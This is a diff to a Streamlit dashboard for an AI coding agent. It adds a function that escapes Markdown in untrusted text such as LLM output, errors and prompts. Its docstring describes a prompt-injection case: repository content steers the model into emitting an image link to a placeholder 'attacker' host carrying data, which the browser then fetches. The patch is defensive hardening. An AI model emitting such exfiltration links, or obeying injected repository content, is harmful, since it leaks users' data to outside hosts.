@@ -9,6 +9,7 @@ Streamlit); `main()` only lays them out.
 """
 
 import asyncio
+import re
 from dataclasses import dataclass
 from pathlib import Path
 
@@ -81,6 +82,18 @@ def approve_blocker(state: AgentProcessState) -> str | None:
         return "no verification result yet"
     failed = [name for name, ok in (("pytest", v.pytest_passed), ("ruff", v.linter_passed)) if not ok]
     return f"verification did not pass ({', '.join(failed)}): revise or reject" if failed else None
+
+
+_MARKDOWN_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$])")
+
+
+def md_escape(text: str) -> str:
+    """Neutralise Markdown in untrusted text (LLM output, tool output, prompts, paths).
+
+    Streamlit renders Markdown in markdown/caption/info/error...; an LLM steered by content of the target
+    repository could otherwise emit `![](https://attacker/?data=...)` and make the browser fetch it.
+    """
+    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)
 
 
 def _quote(text: str) -> str:
@@ -172,7 +185,7 @@ def _decision_panel(view: RunView, db: Path, mock: bool, script: Path | None) ->
         with st.spinner(f"{clicked}: running the next steps..."):
             new_state = asyncio.run(submit_decision(db, state.run_id, request, mock=mock, script=script))
     except _DECISION_ERRORS as exc:
-        st.error(f"{clicked} refused: {exc}")
+        st.error(f"{clicked} refused: {md_escape(str(exc))}")
         return
     st.session_state["flash"] = f"{clicked} recorded: run {new_state.run_id} is now {new_state.status.value}"
     st.rerun()
@@ -180,11 +193,10 @@ def _decision_panel(view: RunView, db: Path, mock: bool, script: Path | None) ->
 
 def _run_details(view: RunView, db: Path, mock: bool, script: Path | None) -> None:
     state, settings = view.state, Settings()
-    reason = f" ({state.terminal_reason})" if state.terminal_reason else ""
-    st.markdown(f"### Run `{state.run_id}` — **{state.status.value}**{reason}")
-    st.caption(
-        f"{state.target_file} in {state.target_repo_path} (base {state.base_branch}) — {state.user_prompt}"
-    )
+    reason = f" ({md_escape(state.terminal_reason)})" if state.terminal_reason else ""
+    st.markdown(f"### Run {md_escape(state.run_id)} — **{state.status.value}**{reason}")
+    target = f"{state.target_file} in {state.target_repo_path} (base {state.base_branch})"
+    st.caption(md_escape(f"{target} — {state.user_prompt}"))
 
     compute = sum(m.compute_ms for m in view.metrics)
     wait = sum(m.wait_ms for m in view.metrics)
@@ -201,16 +213,16 @@ def _run_details(view: RunView, db: Path, mock: bool, script: Path | None) -> No
         _decision_panel(view, db, mock, script)
     if state.compensation is not None:
         c = state.compensation
-        st.info(f"Compensation {c.action}: {'done' if c.done else 'NOT done'} — {c.detail or ''}")
+        st.info(f"Compensation {c.action}: {'done' if c.done else 'NOT done'} — {md_escape(c.detail or '')}")
     if state.error_message:
-        st.error(state.error_message)
+        st.error(md_escape(state.error_message))
 
     plan_tab, verify_tab, journal_tab, approvals_tab, metrics_tab = st.tabs(
         ["Plan & diff", "Verification", "Journal", "Approvals", "Metrics"]
     )
     with plan_tab:
         for i, step in enumerate(state.execution_plan or [], 1):
-            st.markdown(f"{i}. {step}")
+            st.markdown(f"{i}\\. {md_escape(step)}")
         st.code(state.unified_diff or "(no diff yet)", language="diff")
     with verify_tab:
         v = state.verification
@@ -220,7 +232,7 @@ def _run_details(view: RunView, db: Path, mock: bool, script: Path | None) -> No
             verdict = {True: "PASSED", False: "FAILED"}
             st.write(f"pytest: {verdict[v.pytest_passed]} — ruff: {verdict[v.linter_passed]}")
             if v.error_summary:
-                st.markdown(f"**Summary given to the coder:** {v.error_summary}")
+                st.markdown(f"**Summary given to the coder:** {md_escape(v.error_summary)}")
             with st.expander("pytest output"):
                 st.code(v.pytest_output or "(empty)")
             with st.expander("ruff output"):
@@ -268,7 +280,7 @@ def main() -> None:
     if flash := st.session_state.pop("flash", None):
         st.success(flash)
     if not db.exists():
-        st.info(f"No database at {db}. Start a run with `python -m src.cli start ...` first.")
+        st.info(f"No database at {md_escape(str(db))}. Start a run with `python -m src.cli start ...` first.")
         return
     runs = asyncio.run(load_runs(db))
     if not runs:
